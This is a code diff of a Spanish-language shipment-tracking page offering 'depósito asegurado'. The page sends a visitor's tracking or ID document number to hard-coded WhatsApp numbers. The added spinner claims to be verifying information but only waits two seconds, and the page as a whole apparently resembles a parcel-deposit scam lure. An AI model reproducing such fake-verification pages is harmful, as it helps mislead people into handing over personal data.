@@ -20,8 +20,7 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    background:linear-gradient(135deg,#063b2e,#0e6b4f,#0f8a5f);
-    overflow:hidden;
+    background:linear-gradient(135deg,#052e23,#0a5c45,#0e7c59);
 }
 
 .container{
@@ -34,18 +33,12 @@ body{
     box-shadow:0 20px 40px rgba(0,0,0,0.4);
     text-align:center;
     color:white;
-    animation:fadeIn 0.8s ease-in-out;
-}
-
-@keyframes fadeIn{
-    from{opacity:0; transform:translateY(20px);}
-    to{opacity:1; transform:translateY(0);}
 }
 
 h1{
-    font-size:28px;
+    font-size:26px;
     font-weight:700;
-    margin-bottom:10px;
+    margin-bottom:8px;
 }
 
 .subtitle{
@@ -62,7 +55,7 @@ input{
     margin-bottom:15px;
     font-size:15px;
     outline:none;
-    background:rgba(255,255,255,0.9);
+    background:rgba(255,255,255,0.95);
 }
 
 button{
@@ -75,8 +68,6 @@ button{
     cursor:pointer;
     margin-top:10px;
     transition:0.3s;
-    position:relative;
-    overflow:hidden;
 }
 
 .btn-primary{
@@ -93,11 +84,38 @@ button:hover{
     transform:scale(1.03);
 }
 
+button:disabled{
+    opacity:0.6;
+    cursor:not-allowed;
+}
+
 .error{
     font-size:13px;
     color:#ffb3b3;
     display:none;
     margin-bottom:10px;
+}
+
+/* Loader */
+.loader-container{
+    display:none;
+    margin-top:15px;
+    font-size:14px;
+}
+
+.loader{
+    width:22px;
+    height:22px;
+    border:3px solid rgba(255,255,255,0.3);
+    border-top:3px solid white;
+    border-radius:50%;
+    margin:10px auto;
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+    0%{transform:rotate(0deg);}
+    100%{transform:rotate(360deg);}
 }
 
 .footer{
@@ -116,20 +134,25 @@ button:hover{
         Consulta el estado de tu envío con depósito asegurado
     </div>
 
-    <input type="text" id="guia" placeholder="Ingresa número de guía">
-    <input type="text" id="documento" placeholder="Ingresa número de documento">
+    <input type="text" id="guia" placeholder="Ingresa número de guía" oninput="soloNumeros(this)">
+    <input type="text" id="documento" placeholder="Ingresa número de documento" oninput="soloNumeros(this)">
 
     <div class="error" id="error">
-        Debe ingresar el dato correspondiente
+        Debe ingresar solo números válidos
     </div>
 
-    <button class="btn-primary" onclick="consultarGuia()">
+    <button class="btn-primary" id="btnGuia" onclick="consultarGuia()">
         Consultar Guía
     </button>
 
-    <button class="btn-secondary" onclick="consultarDocumento()">
+    <button class="btn-secondary" id="btnDoc" onclick="consultarDocumento()">
         Chat Bot Documento
     </button>
+
+    <div class="loader-container" id="loaderBox">
+        <div class="loader"></div>
+        Verificando información...
+    </div>
 
     <div class="footer">
         Servicio exclusivo depósito asegurado
@@ -137,6 +160,23 @@ button:hover{
 </div>
 
 <script>
+
+function soloNumeros(input){
+    input.value = input.value.replace(/[^0-9]/g,'');
+}
+
+function mostrarLoader(){
+    document.getElementById("loaderBox").style.display="block";
+    document.getElementById("btnGuia").disabled = true;
+    document.getElementById("btnDoc").disabled = true;
+}
+
+function ocultarLoader(){
+    document.getElementById("loaderBox").style.display="none";
+    document.getElementById("btnGuia").disabled = false;
+    document.getElementById("btnDoc").disabled = false;
+}
+
 function consultarGuia(){
     var guia = document.getElementById("guia").value.trim();
     var error = document.getElementById("error");
@@ -147,11 +187,14 @@ function consultarGuia(){
     }
 
     error.style.display="none";
+    mostrarLoader();
 
-    var numero = "573508995621";
-    var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0AGuía: " + guia;
-
-    window.open("https://wa.me/" + numero + "?text=" + mensaje, "_blank");
+    setTimeout(function(){
+        var numero = "573508995621";
+        var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0AGuía: " + guia;
+        window.open("https://wa.me/" + numero + "?text=" + mensaje, "_blank");
+        ocultarLoader();
+    },2000);
 }
 
 function consultarDocumento(){
@@ -164,12 +207,16 @@ function consultarDocumento(){
     }
 
     error.style.display="none";
+    mostrarLoader();
 
-    var numero = "573026219839";
-    var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0ADocumento: " + doc;
-
-    window.open("https://wa.me/" + numero + "?text=" + mensaje, "_blank");
+    setTimeout(function(){
+        var numero = "573026219839";
+        var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0ADocumento: " + doc;
+        window.open("https://wa.me/" + numero + "?text=" + mensaje, "_blank");
+        ocultarLoader();
+    },2000);
 }
+
 </script>
 
 </body>
